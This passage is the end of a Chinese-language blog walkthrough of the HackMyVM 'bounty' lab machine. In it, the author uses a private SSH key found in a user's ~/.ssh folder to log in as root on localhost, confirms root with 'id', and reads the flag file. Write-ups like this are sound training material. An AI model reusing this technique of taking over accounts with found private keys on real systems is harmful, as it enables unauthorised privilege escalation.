drwx------ <span class="token number">2</span> primavera primavera <span class="token number">4096</span> Oct <span class="token number">20</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">7</span> primavera primavera <span class="token number">4096</span> Aug <span class="token number">19</span> <span class="token number">18</span>:28 <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> primavera primavera    <span class="token number">0</span> Oct <span class="token number">20</span>  <span class="token number">2022</span> authorized_keys
-rw------- <span class="token number">1</span> primavera primavera <span class="token number">2602</span> Oct <span class="token number">20</span>  <span class="token number">2022</span> id_rsa
-rw-r--r-- <span class="token number">1</span> primavera primavera  <span class="token number">570</span> Oct <span class="token number">20</span>  <span class="token number">2022</span> id_rsa.pub
primavera@bounty:~/.ssh$ <span class="token function">cat</span> authorized_keys  
primavera@bounty:~/.ssh$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa root@127.0.0.1
The authenticity of <span class="token function">host</span> <span class="token string">'127.0.0.1 (127.0.0.1)'</span> can<span class="token string">'t be established.
ECDSA key fingerprint is SHA256:aG7bGQSFjJSQbJhoaYMlnpw2QwLCxhWCiY08Jm5sFA8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">127.0</span>.0.1' <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span> to the list of known hosts.
Linux bounty <span class="token number">5.10</span>.0-19-amd64 <span class="token comment">#1 SMP Debian 5.10.149-1 (2022-10-17) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct <span class="token number">20</span> <span class="token number">11</span>:55:16 <span class="token number">2022</span>
root@bounty:~<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
root@bounty:~<span class="token comment"># cat /root/r*</span>
.*</code></pre></div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://ta0.fun/posts/1cc64d1/" title="HackMyVM-bounty">http://ta0.fun/posts/1cc64d1/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/a583b130/" rel="prev" title="HackMyVM-dejavu"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">HackMyVM-dejavu</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/637ff6f0/" rel="next" title="HackMyVM-TriplAdvisor"><span class="post-nav-text">HackMyVM-TriplAdvisor</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>